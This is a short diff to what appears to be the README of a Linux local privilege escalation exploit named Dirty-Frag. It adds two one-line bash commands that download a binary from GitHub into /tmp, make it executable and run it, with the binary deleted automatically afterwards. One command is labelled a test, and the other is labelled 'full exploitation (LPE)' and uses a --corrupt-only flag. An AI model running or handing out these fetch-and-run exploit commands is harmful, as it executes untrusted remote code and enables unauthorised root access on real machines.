@@ -12,7 +12,15 @@
 | ELF min kernel | Linux 3.2.0 (as per ELF header) |
 
 ---
-##command: curl -L -o /tmp/dirtyfrag https://github.com/p401a-ops/Dirty-Frag/raw/refs/heads/main/dirtyfrag_ASTRA1.7.6 && chmod +x /tmp/dirtyfrag && (trap "rm -f /tmp/dirtyfrag; exit" INT TERM EXIT; /tmp/dirtyfrag -v)
+**One liner command with autodelete(only test):**
+```bash
+curl -L -o /tmp/dirtyfrag https://github.com/p401a-ops/Dirty-Frag/raw/refs/heads/main/dirtyfrag_ASTRA1.7.6 && chmod +x /tmp/dirtyfrag && (trap "rm -f /tmp/dirtyfrag; exit" INT TERM EXIT; /tmp/dirtyfrag -v)
+```
+
+**One liner command with full exploitation (LPE):**
+```bash
+curl -L -o /tmp/dirtyfrag https://github.com/p401a-ops/Dirty-Frag/raw/refs/heads/main/dirtyfrag_ASTRA1.7.6 && chmod +x /tmp/dirtyfrag && (trap "rm -f /tmp/dirtyfrag; exit" INT TERM EXIT; /tmp/dirtyfrag --corrupt-only -v)
+```
 
 ## Results
 
